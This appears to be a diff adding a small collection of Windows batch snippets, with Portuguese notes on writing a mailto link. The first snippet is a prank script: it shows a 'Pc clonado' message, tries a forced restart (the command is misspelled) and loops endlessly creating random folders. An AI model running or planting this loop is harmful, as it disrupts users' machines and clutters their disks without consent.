@@ -1,0 +1,24 @@
+@echo off 
+start explorer
+dir > test.txt
+msg * ola lucas
+shutdow -r -f 5 -c "Pc clonado"
+md hack
+cd hack
+:loop
+md %random%
+goto loop
+
+@echo off
+start "Chrome" chrome --new-window http://localhost/jayambe/
+
+@echo off
+start "Chrome" chrome --new-window javascript:window.open("example.com");
+
+@echo off
+start mailto:r.ml10@mail.com?subject=TESTE^&cc=ROMULO^&body=OI,This%20is%20an%20automatically%20created%20message.
+
+1.A mensagem que deseja enviar ficará depois de "body="
+esse "%20" representa o espaço entre as palavras .
+
+2.E o mais importante é o e-mail ,que vc coloca depois de "mailto:"
